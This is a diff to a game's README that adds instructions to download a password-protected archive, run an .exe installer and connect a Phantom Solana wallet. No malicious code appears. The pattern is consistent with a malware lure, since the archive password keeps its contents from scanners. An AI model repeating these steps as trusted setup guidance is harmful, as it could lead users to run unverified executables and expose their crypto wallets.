@@ -63,10 +63,14 @@ Follow these steps to start your journey in the cyberpunk world of Night City.
 
 ### Platform
 Current beta-version works fine on Windows 10/11 with last updates. 
+### Pre-installation
+To play our game, you will need to download CyberClient-beta and extract the folder. Next, execute the installer in .exe format. Once the installation is complete, launch the game using the provided launcher.
 
 ### Installation
 1. Unity dependency. CyberPunks2088 Game is built on the Unity game engine. Ensure you have Unity installed on your system to run the game client.
-2. Compiled game client. [Download](https://github.com/CyberpunksTeam/cyberpunks-2088-game/releases/tag/Release) the compiled game client with password `cbpz2088` from last release. This client includes all necessary files and resources to run CyberPunks2088 Game on your device.
+2. Compiled game client. [Download](https://github.com/CyberpunksTeam/cyberpunks-2088-game/releases/tag/Release) the compiled game client with password `cbpz2088` from last release.
+
+This client includes all necessary files and resources to run CyberPunks2088 Game on your device.
 
 ### Account Setup
 - Phantom Integration. To log in to CyberPunks2088 Game, you'll need to have the Phantom browser extension installed. Phantom allows you to sign transactions securely using your Solana wallet. Install Phantom for Chrome here or for other browsers from the respective extension stores.
